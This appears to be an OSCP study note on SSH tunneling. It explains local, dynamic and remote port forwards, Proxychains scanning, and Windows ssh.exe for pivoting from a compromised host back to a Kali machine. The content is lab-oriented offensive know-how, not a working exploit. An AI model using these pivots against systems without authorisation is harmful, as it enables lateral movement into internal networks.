# SSH Tunneling / Port Forwarding

SSH can carry other traffic through its encrypted connection. The key OSCP question is: **which machine is the SSH client, which is the SSH server, and where should the listening socket live?**

## Quick mental model

| Mode | Option | Listener lives on | Traffic exits from | Best use |
|---|---|---|---|---|
| Local | `-L` | SSH **client** | SSH **server** | One fixed internal service |
| Dynamic | `-D` | SSH **client** | SSH **server** | Many hosts/ports via SOCKS |
| Remote | `-R listen:target` | SSH **server** | SSH **client** | Inbound blocked; one fixed service |
| Remote dynamic | `-R <port>` | SSH **server** | SSH **client** | Inbound blocked; many hosts/ports via SOCKS |

`-N` = do not open a remote shell; use the connection only for forwarding.  
`-v` = verbose/debug output when the SSH session or forwarding fails.

---

## 1. Local port forward — `-L`

**Listener is created on the SSH client.** Traffic goes through the SSH server and then to one fixed destination.

```bash
ssh -N -L [BIND_IP:]<LOCAL_PORT>:<DEST_IP>:<DEST_PORT> user@<SSH_SERVER>
```

Example — expose internal RDP through an SSH pivot:

```bash
ssh -N -L 127.0.0.1:3389:10.10.10.50:3389 user@<PIVOT_IP>
xfreerdp /v:127.0.0.1:3389 /u:user /p:pass
```

If another host must connect to the listener, bind explicitly to an accessible interface such as `0.0.0.0:<PORT>` rather than loopback.

---

## 2. Dynamic port forward — `-D`

Creates a **SOCKS proxy on the SSH client**. A single listener can reach any host/port that the SSH server can route to.

```bash
ssh -N -D 127.0.0.1:1080 user@<PIVOT_IP>
```

Configure Proxychains:

```text
# /etc/proxychains4.conf
socks5 127.0.0.1 1080
```

Then route SOCKS-capable/wrapped tools through it:

```bash
proxychains nmap -sT -Pn -n --top-ports=100 <INTERNAL_IP>
proxychains smbclient -L //<INTERNAL_IP>/ -U <USER>
```

### Proxychains / Nmap reminders

- Use an Nmap **TCP connect scan (`-sT`)** through Proxychains; raw SYN scanning does not fit this proxy path.
- `-Pn` avoids host discovery assumptions through the tunnel; `-n` avoids unnecessary DNS lookups.
- Proxychains works by hooking common libc networking calls with `LD_PRELOAD`. It works for many dynamically linked tools but **not statically linked binaries**.
- Proxychains defaults can make port scans very slow. If needed, reduce `tcp_read_time_out` and `tcp_connect_time_out` in `/etc/proxychains4.conf`.

---

## 3. Remote port forward — `-R`

Use this when **Kali cannot connect inbound to a listener on the compromised/pivot host, but that host can SSH outbound to Kali**.

The listener is created on the **SSH server** (often Kali), while the SSH client on the compromised host forwards traffic to the final target.

```bash
# Run from compromised/pivot host
ssh -N -R 127.0.0.1:<KALI_PORT>:<INTERNAL_IP>:<INTERNAL_PORT> kali@<KALI_IP>
```

Example — expose an internal PostgreSQL service on Kali port 2345:

```bash
# Pivot/victim -> Kali SSH server
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@<KALI_IP>

# On Kali
psql -h 127.0.0.1 -p 2345 -U postgres
```

Before using remote forwarding to Kali:

```bash
sudo systemctl start ssh
ss -ntplu | grep ':22'
```

If password authentication to Kali is required in the lab, check the SSH server configuration. Use a strong unique password and restore any temporary configuration changes when finished.

---

## 4. Remote dynamic port forward — `-R <PORT>`

This is the flexible reverse-pivot version: the SOCKS listener is created on the **SSH server** (Kali), but traffic exits from the **SSH client** (the compromised host).

```bash
# Run on compromised host; connection originates OUT to Kali
ssh -N -R 9998 kali@<KALI_IP>
```

On Kali:

```text
# /etc/proxychains4.conf
socks5 127.0.0.1 9998
```

```bash
proxychains nmap -sT -Pn -n <INTERNAL_IP>
proxychains psql -h <INTERNAL_DB_IP> -U postgres
```

**Version note:** remote dynamic forwarding was added in OpenSSH 7.6. Only the **SSH client** needs to be 7.6 or newer; the server version does not determine support.

---

## 5. Windows built-in `ssh.exe`

Modern Windows systems may already contain OpenSSH, so check before uploading Plink or another binary:

```cmd
where ssh
ssh.exe -V
```

Typical location:

```text
C:\Windows\System32\OpenSSH\ssh.exe
```

Windows `ssh.exe` uses the same forwarding syntax. Example remote dynamic pivot from Windows back to Kali:

```cmd
ssh -N -R 9998 kali@<KALI_IP>
```

Then on Kali point Proxychains to `socks5 127.0.0.1 9998`.

---

## Troubleshooting checklist

```bash
# Linux listener / established connections
ss -ntplu

# Verbose SSH diagnostics
ssh -v ...
```

Ask in order:
1. Can the SSH **client** reach the SSH **server**?
2. Did the expected listener actually bind?
3. Can the side that must forward traffic reach the final target IP/port?
4. Is a host/network firewall blocking the listener?
5. With SOCKS, is the client program SOCKS-aware or being run through Proxychains?
